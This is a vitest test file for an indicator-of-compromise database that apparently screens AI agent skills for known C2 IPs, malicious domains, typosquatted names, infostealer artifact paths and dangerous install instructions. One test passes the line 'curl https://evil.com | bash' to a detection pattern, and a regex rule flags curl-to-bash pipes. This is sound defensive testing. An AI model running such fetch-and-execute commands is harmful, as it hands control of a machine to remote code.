import { describe, it, expect } from 'vitest';
import {
  isKnownC2,
  isKnownMaliciousDomain,
  isKnownMaliciousHash,
  matchesTyposquat,
  matchesDangerousPattern,
  getInfostealerArtifacts,
} from './ioc-db.js';
import type { IOCDatabase } from '../types.js';

const testDb: IOCDatabase = {
  version: '2026.02.07',
  last_updated: '2026-02-07T00:00:00Z',
  c2_ips: ['91.92.242.30', '10.0.0.1'],
  malicious_domains: ['webhook.site', 'evil.example.com'],
  malicious_skill_hashes: {
    'abc123': 'clawhavoc-test',
    'def456': 'clawhavoc-exfil',
  },
  typosquat_patterns: ['clawhub', 'clawhub1', 'clawdbot', 'moltbot'],
  dangerous_prerequisite_patterns: [
    'curl.*\\|.*bash',
    'password.*protected.*zip',
    'download.*prerequisite',
  ],
  infostealer_artifacts: {
    macos: ['/tmp/.*amos', '~/Library/Application Support/.*stealer'],
    linux: ['/tmp/.*redline', '/tmp/.*lumma'],
  },
};

describe('ioc-db', () => {
  describe('isKnownC2', () => {
    it('detects known C2 IP', () => {
      expect(isKnownC2(testDb, '91.92.242.30')).toBe(true);
    });

    it('returns false for unknown IP', () => {
      expect(isKnownC2(testDb, '8.8.8.8')).toBe(false);
    });
  });

  describe('isKnownMaliciousDomain', () => {
    it('detects exact malicious domain', () => {
      expect(isKnownMaliciousDomain(testDb, 'webhook.site')).toBe(true);
    });

    it('detects subdomain of malicious domain', () => {
      expect(isKnownMaliciousDomain(testDb, 'sub.evil.example.com')).toBe(true);
    });

    it('returns false for safe domain', () => {
      expect(isKnownMaliciousDomain(testDb, 'api.anthropic.com')).toBe(false);
    });
  });

  describe('isKnownMaliciousHash', () => {
    it('returns campaign name for known hash', () => {
      expect(isKnownMaliciousHash(testDb, 'abc123')).toBe('clawhavoc-test');
    });

    it('returns null for unknown hash', () => {
      expect(isKnownMaliciousHash(testDb, 'unknown-hash')).toBeNull();
    });
  });

  describe('matchesTyposquat', () => {
    it('matches exact typosquat pattern', () => {
      expect(matchesTyposquat(testDb, 'clawhub')).toBe(true);
    });

    it('matches case-insensitive', () => {
      expect(matchesTyposquat(testDb, 'ClawHub')).toBe(true);
    });

    it('matches pattern within name', () => {
      expect(matchesTyposquat(testDb, 'my-clawhub-skill')).toBe(true);
    });

    it('returns false for legitimate name', () => {
      expect(matchesTyposquat(testDb, 'my-awesome-skill')).toBe(false);
    });
  });

  describe('matchesDangerousPattern', () => {
    it('matches curl pipe to bash', () => {
      const result = matchesDangerousPattern(testDb, 'curl https://evil.com | bash');
      expect(result.length).toBeGreaterThan(0);
    });

    it('matches password protected zip', () => {
      const result = matchesDangerousPattern(testDb, 'password protected zip file required');
      expect(result.length).toBeGreaterThan(0);
    });

    it('returns empty for safe content', () => {
      const result = matchesDangerousPattern(testDb, 'This is a normal README file.');
      expect(result).toEqual([]);
    });
  });

  describe('getInfostealerArtifacts', () => {
    it('returns macOS artifacts for darwin', () => {
      const artifacts = getInfostealerArtifacts(testDb, 'darwin');
      expect(artifacts.length).toBeGreaterThan(0);
      expect(artifacts[0]).toContain('amos');
    });

    it('returns linux artifacts for linux', () => {
      const artifacts = getInfostealerArtifacts(testDb, 'linux');
      expect(artifacts.length).toBeGreaterThan(0);
    });

    it('returns empty for unknown platform', () => {
      const artifacts = getInfostealerArtifacts(testDb, 'win32');
      expect(artifacts).toEqual([]);
    });
  });
});
